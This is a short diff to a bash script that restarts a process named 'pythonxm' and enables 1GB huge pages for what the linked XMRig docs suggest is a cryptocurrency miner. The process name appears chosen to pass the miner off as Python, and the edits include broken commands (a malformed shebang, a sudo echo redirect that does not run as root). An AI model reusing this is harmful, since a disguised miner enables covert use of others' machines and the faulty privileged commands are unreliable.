@@ -1,5 +1,5 @@
 #!bin/bash -xe 
-echo '#### Version 0.0.4 ####'
+echo '#### Version 0.0.5 ####'
 if [ $(ps -aux |grep pythonxm |wc -l) -le 1 ]
 then 
 echo "No process,let's start -> $(ps -aux |grep pythonxm |wc -l)"
@@ -18,11 +18,12 @@ rm -rf x.out
 
 # https://xmrig.com/docs/miner/hugepages#onegb-huge-pages
 
-sysctl -w vm.nr_hugepages=$(nproc)
+sudo sysctl -w vm.nr_hugepages=$(nproc)
 
 for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
 do
-    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+    sudo mkdir "$i/hugepages/hugepages-1048576kB";
+    sudo echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
 done
 
 echo "1GB pages successfully enabled"
